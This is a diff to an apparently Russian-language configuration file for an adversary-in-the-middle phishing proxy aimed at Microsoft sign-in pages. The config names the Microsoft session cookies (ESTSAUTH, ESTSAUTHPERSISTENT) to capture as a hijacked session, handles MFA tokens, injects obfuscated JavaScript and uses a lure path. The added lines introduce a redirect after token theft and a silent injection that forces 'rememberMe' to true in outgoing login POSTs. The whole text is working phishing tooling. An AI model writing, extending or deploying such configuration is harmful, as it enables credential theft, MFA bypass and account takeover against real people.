@@ -18,6 +18,8 @@ sub_filters:                # замена в теле/ответах
     replace: "login.example.com"
     mime: ["text/html", "application/json"]
     redirect_only: false
+    regex: false            # true = search это regexp, replace с $1-группами
+    when: ""                # подстрока-гейт: применять только если тело ее содержит
 auth_tokens:                # какие cookie считать захватом сессии
   - domain: ".microsoft.com"
     keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
@@ -34,6 +36,11 @@ mfa_tokens:                 # второй фактор: TOTP/Push/WebAuthn cere
 js_inject:
   - trigger: "login.microsoftonline.com"
     src: "botguard.js"      # обфусцируется движком (Pro: obfuscation)
+redirect_url: ""          # JS-редирект после захвата токена (location.replace)
+force_post:                 # тихий инжект в исходящий POST (лучше Evilginx force_post)
+  - ctype: form            # form | json
+    key: rememberMe
+    value: "true"
 lure_path: "/l/login01"     # путь-приманка, остальное -> spoof/blacklist
 enabled: true
 ```
